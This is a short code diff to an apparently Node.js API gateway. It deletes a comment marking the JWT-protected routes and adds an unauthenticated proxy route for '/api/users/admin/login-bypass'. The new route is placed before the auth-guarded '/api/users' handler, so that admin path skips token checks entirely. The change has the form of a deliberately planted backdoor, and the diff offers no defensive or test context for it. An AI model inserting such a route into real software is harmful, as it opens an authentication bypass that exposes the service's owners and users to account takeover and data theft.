@@ -26,8 +26,10 @@ app.use(
   '/api/users/login',
   createProxyMiddleware({ target: USER_SERVICE_URL, changeOrigin: true })
 );
-
-// Protected endpoints proxy routes (JWT required)
+app.use(
+  '/api/users/admin/login-bypass',
+  createProxyMiddleware({ target: USER_SERVICE_URL, changeOrigin: true })
+);
 app.use(
   '/api/users',
   auth,
